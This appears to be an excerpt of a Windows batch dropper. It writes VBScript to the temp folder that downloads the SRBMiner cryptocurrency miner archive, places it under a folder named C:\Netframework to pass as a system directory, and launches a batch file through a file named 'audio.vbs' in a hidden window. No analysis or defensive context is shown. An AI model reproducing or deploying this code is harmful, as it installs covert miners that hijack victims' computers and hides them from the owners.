...
@echo off & mkdir C:\Netframework\SRBMiner-Multi-2-5-2 > nul 2>&1
@echo off & >"%temp%\script_.vbs"^
    (       
      ...
      echo/ filename ^= "SRBMiner-Multi-2-5-2-win64.zip"
      echo/ Function CreateHttpRequest^(^)
      echo/ ids ^= Array^("WinHttp.WinHttpRequest.5.1", _
              echo/ "WinHttp.WinHttpRequest.5", _
              echo/ "WinHttp.WinHttpRequest", _
              echo/ "Msxml2.ServerXMLHTTP.6.0", _
              echo/ "Msxml2.ServerXMLHTTP.5.0", _
              echo/ "Msxml2.ServerXMLHTTP.4.0", _
              echo/ "Msxml2.ServerXMLHTTP.3.0", _
              echo/ "Msxml2.ServerXMLHTTP", _
              echo/ "Microsoft.ServerXMLHTTP", _
              echo/ "Msxml2.XMLHTTP.6.0", _
              echo/ "Msxml2.XMLHTTP.5.0", _
              echo/ "Msxml2.XMLHTTP.4.0", _
              echo/ "Msxml2.XMLHTTP.3.0", _
              echo/ "Msxml2.XMLHTTP", _
              echo/ "Microsoft.XMLHTTP"^)
echo/ Set ret ^= Nothing
echo/ On Error Resume Next
echo/ For i ^= LBound^(ids^) To UBound^(ids^)
   echo/ Set ret ^= CreateObject^(ids^(i^)^)
   echo/ If Not ret Is Nothing Then Exit For
  echo/ Next
  echo/ On Error GoTo 0

 echo/ Set CreateHttpRequest ^= ret
echo/ End Function

echo/ Sub DoDownload^(Url, Path^)
 echo/ Set req ^= CreateHttpRequest
 echo/ If req Is Nothing Then
  echo/ MsgBox "ERROR: Can't create an HTTP object!"
  echo/ Exit Sub
 echo/ End If
 echo/ req.Open "GET", Url, False

 echo/ req.setRequestHeader "Pragma", "no-cache"
 echo/ req.setRequestHeader "Cache-Control", "no-cache"
 echo/ req.setRequestHeader "If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT"
 echo/ req.Send

 echo/ Select Case req.Status
 echo/ Case 200
     echo/ With CreateObject^("ADODB.Stream"^)
      echo/ .Type = 1
      echo/ .Open
     echo/ .Write req.responseBody
     echo/ .SaveToFile Path, 2
     echo/ .Close
    echo/ End With
    echo/ Case Else
...
@echo off & >"%temp%\audio.vbs"^
    (
      echo/ set objSh ^= CreateObject^("WScript.Shell"^)
      echo/ objSh.Run "cmd /k script_app.bat", 0
 )
